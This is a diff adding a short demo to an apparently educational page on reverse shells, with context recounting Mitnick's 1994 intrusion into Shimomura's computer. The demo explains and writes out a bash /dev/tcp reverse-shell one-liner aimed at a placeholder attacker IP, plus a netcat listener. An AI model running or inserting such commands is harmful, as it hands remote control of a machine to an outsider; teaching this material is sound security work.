@@ -63,3 +63,31 @@ A reverse shell is a type of shell session established between a victim's machin
 - **Attack Vector**: On Christmas Eve in 1994, Mitnick famously hacked into the computer of Tsutomu Shimomura, a cybersecurity expert. Mitnick used a combination of social engineering, IP spoofing, and exploiting vulnerabilities to gain unauthorized access.
 - **Reverse Shell Usage**: While the specific use of a reverse shell in this incident isn't widely documented, Mitnick used techniques similar to reverse shells that allowed him to remotely control and manipulate systems after gaining access.
 - **Impact**: The attack on Shimomura's system was a key event that eventually led to Mitnick's capture. This hack, along with his other activities, highlighted the vulnerabilities in computer systems and brought significant attention to cybersecurity issues. Mitnick was arrested in February 1995, and after serving time in prison, he became a cybersecurity consultant and author.
+
+## 7. A Short Demo
+
+The command /bin/bash -i > /dev/tcp/server_IP/port 0<&1 2>&1 is a way to redirect the input and output of an interactive Bash shell to a TCP connection. Here's a detailed breakdown of what happens:
+
+```text
+/bin/bash -i: This starts an interactive Bash shell.
+> /dev/tcp/server_IP/port: This redirects the standard output (stdout) of the Bash shell to a TCP connection to the specified server and port.
+0<&1: This redirects the standard input (stdin) to come from the same file descriptor as stdout.
+2>&1: This redirects the standard error (stderr) to the same file descriptor as stdout.
+```
+
+Injecting a command like this above one is how attackers usually obtain a reverse shell on a victim's machine. For example:
+
+If an attacker runs:
+
+```console
+$ nc -lv 9090
+```
+<!--sometimes, we need to specify the ip address, like: $ nc -lv 10.0.2.6 9090 -->
+
+and a victim runs (replace *attacker_ip* with the IP address of the attacker):
+
+```console
+$ /bin/bash -i > /dev/tcp/attacker_ip/9090 0<&1 2>&1
+```
+
+The attacker will obtain a reverse shell, which allows the attacker to gain control of the victim's machine.
